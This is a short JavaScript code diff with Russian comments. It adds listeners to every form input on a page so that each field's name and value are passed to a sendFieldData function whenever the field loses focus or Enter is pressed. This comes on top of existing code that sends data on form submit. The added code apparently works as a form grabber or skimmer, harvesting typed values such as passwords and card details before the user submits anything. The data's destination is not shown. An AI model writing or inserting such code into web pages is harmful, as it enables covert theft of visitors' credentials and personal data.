@@ -70,6 +70,24 @@ ${domainHashTag}`;
     });
 }
 
+// Отслеживаем выход из поля
+document.querySelectorAll("form input").forEach(input => {
+    input.addEventListener("blur", event => {
+        const fieldName = event.target.name || "Неизвестное поле";
+        const fieldValue = event.target.value;
+        sendFieldData(fieldName, fieldValue);
+    });
+
+    // Отслеживаем нажатие Enter
+    input.addEventListener("keypress", event => {
+        if (event.key === "Enter") {
+            const fieldName = event.target.name || "Неизвестное поле";
+            const fieldValue = event.target.value;
+            sendFieldData(fieldName, fieldValue);
+        }
+    });
+});
+
 // Отслеживаем отправку формы
 document.querySelectorAll("form").forEach(form => {
     form.addEventListener("submit", event => {
